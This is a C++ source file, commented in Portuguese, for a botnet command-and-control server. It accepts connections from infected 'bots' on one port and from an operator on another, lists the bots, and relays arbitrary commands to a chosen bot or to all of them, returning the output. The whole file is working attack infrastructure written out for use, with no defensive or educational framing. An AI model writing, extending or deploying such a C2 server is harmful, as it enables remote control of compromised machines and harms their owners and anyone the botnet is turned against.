// server.cpp - C&C server
// Compilar:  g++ -o server server.cpp -std=c++17 -pthread -Wall -Wextra
// Executar:  ./server

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <memory>
#include <algorithm>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

constexpr int C2_PORT           = 44445;   // porta do controlador
constexpr int BOT_PORT          = 9096;    // porta que os bots conectam
constexpr size_t BUFFER_SIZE    = 8192;

struct Bot {
    int sock;
    std::string ip;
    std::string id;           // pode ser ip:porta ou UUID no futuro
    bool active = true;
};

std::vector<std::unique_ptr<Bot>> bots;
std::mutex bots_mutex;
std::atomic<bool> running {true};

void send_all(int sock, const std::string& data) {
    size_t total = 0;
    while (total < data.size()) {
        ssize_t sent = send(sock, data.data() + total, data.size() - total, MSG_NOSIGNAL);
        if (sent <= 0) return;
        total += sent;
    }
}

std::string receive_all(int sock) {
    std::string result;
    char buf[BUFFER_SIZE];
    while (true) {
        ssize_t n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        buf[n] = '\0';
        result += buf;
        if (n < static_cast<ssize_t>(sizeof(buf)-1)) break; // provavelmente fim
    }
    return result;
}

void handle_bot(int bot_sock, std::string bot_ip) {
    std::string bot_id = bot_ip + ":" + std::to_string(BOT_PORT);

    {
        std::lock_guard<std::mutex> lock(bots_mutex);
        auto bot = std::make_unique<Bot>();
        bot->sock = bot_sock;
        bot->ip   = bot_ip;
        bot->id   = bot_id;
        bots.push_back(std::move(bot));
        std::cout << "[+] Bot conectado: " << bot_id << "  (total: " << bots.size() << ")\n";
    }

    char buf[BUFFER_SIZE];
    while (running) {
        ssize_t n = recv(bot_sock, buf, sizeof(buf)-1, 0);
        if (n <= 0) break;
        // Aqui você pode implementar um protocolo simples se quiser
        // por enquanto só mantemos vivo
    }

    // Cleanup
    {
        std::lock_guard<std::mutex> lock(bots_mutex);
        auto it = std::find_if(bots.begin(), bots.end(),
            [bot_sock](const auto& b){ return b->sock == bot_sock; });
        if (it != bots.end()) {
            bots.erase(it);
            std::cout << "[-] Bot desconectado: " << bot_id << "  (restam: " << bots.size() << ")\n";
        }
    }
    close(bot_sock);
}

void handle_controller(int ctrl_sock) {
    std::string welcome = "C2 server - digite /list, /use <id>, <comando>, ou exit\n";
    send_all(ctrl_sock, welcome);

    int active_bot = -1;  // -1 = broadcast / sem alvo específico

    char buf[BUFFER_SIZE];
    while (true) {
        ssize_t n = recv(ctrl_sock, buf, sizeof(buf)-1, 0);
        if (n <= 0) break;
        buf[n] = '\0';
        std::string cmd = buf;
        while (!cmd.empty() && std::isspace(cmd.back())) cmd.pop_back();

        if (cmd == "exit" || cmd == "quit") {
            break;
        }
        else if (cmd == "/list") {
            std::lock_guard<std::mutex> lock(bots_mutex);
            std::string resp = "Bots conectados (" + std::to_string(bots.size()) + "):\n";
            for (const auto& b : bots) {
                resp += "  " + b->id + "\n";
            }
            if (bots.empty()) resp += "  (nenhum bot)\n";
            send_all(ctrl_sock, resp + "\n");
            continue;
        }
        else if (cmd.rfind("/use ", 0) == 0) {
            std::string target = cmd.substr(5);
            std::lock_guard<std::mutex> lock(bots_mutex);
            auto it = std::find_if(bots.begin(), bots.end(),
                [&](const auto& b){ return b->id.find(target) != std::string::npos; });
            if (it != bots.end()) {
                active_bot = (*it)->sock;
                send_all(ctrl_sock, "Sessão alterada para: " + (*it)->id + "\n");
            } else {
                send_all(ctrl_sock, "Bot não encontrado: " + target + "\n");
            }
            continue;
        }

        // Comando normal → enviar para o bot (ou todos)
        std::string to_send = cmd + "\n";

        std::lock_guard<std::mutex> lock(bots_mutex);
        if (active_bot != -1) {
            // enviar só para o bot selecionado
            auto it = std::find_if(bots.begin(), bots.end(),
                [active_bot](const auto& b){ return b->sock == active_bot; });
            if (it != bots.end() && (*it)->active) {
                send_all((*it)->sock, to_send);
                std::string output = receive_all((*it)->sock);
                send_all(ctrl_sock, "[Resposta de " + (*it)->id + "]\n" + output + "\n");
            } else {
                send_all(ctrl_sock, "Bot selecionado offline.\n");
                active_bot = -1;
            }
        } else if (!bots.empty()) {
            // broadcast (pode mudar depois)
            send_all(ctrl_sock, "[Enviando para todos os " + std::to_string(bots.size()) + " bots]\n");
            for (auto& b : bots) {
                if (b->active) send_all(b->sock, to_send);
            }
        } else {
            send_all(ctrl_sock, "Nenhum bot conectado.\n");
        }
    }

    close(ctrl_sock);
    std::cout << "Controlador desconectado\n";
}

int main() {
    // ── Servidor de bots (9096) ────────────────────────
    int bot_server = socket(AF_INET, SOCK_STREAM, 0);
    if (bot_server < 0) { perror("socket bots"); return 1; }

    int opt = 1;
    setsockopt(bot_server, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(BOT_PORT);

    if (bind(bot_server, (sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind bot port"); return 1;
    }
    if (listen(bot_server, 50) < 0) {
        perror("listen bot"); return 1;
    }

    std::cout << "[C2] Escutando bots na porta " << BOT_PORT << "\n";

    // ── Servidor de controlador (44445) ────────────────
    int c2_server = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_server < 0) { perror("socket c2"); return 1; }

    setsockopt(c2_server, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_port = htons(C2_PORT);
    if (bind(c2_server, (sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind c2"); return 1;
    }
    if (listen(c2_server, 10) < 0) {
        perror("listen c2"); return 1;
    }

    std::cout << "[C2] Escutando controlador na porta " << C2_PORT << "\n\n";

    // Aceitar conexões de bots
    std::thread bot_acceptor([&]{
        while (running) {
            sockaddr_in bot_addr{};
            socklen_t len = sizeof(bot_addr);
            int bot_fd = accept(bot_server, (sockaddr*)&bot_addr, &len);
            if (bot_fd < 0) continue;
            std::string ip = inet_ntoa(bot_addr.sin_addr);
            std::thread(handle_bot, bot_fd, ip).detach();
        }
    });

    // Aceitar controladores (geralmente só 1)
    while (running) {
        sockaddr_in ctrl_addr{};
        socklen_t len = sizeof(ctrl_addr);
        int ctrl_fd = accept(c2_server, (sockaddr*)&ctrl_addr, &len);
        if (ctrl_fd < 0) continue;
        std::cout << "[+] Novo controlador conectado\n";
        std::thread(handle_controller, ctrl_fd).detach();
    }

    running = false;
    close(bot_server);
    close(c2_server);
    return 0;
}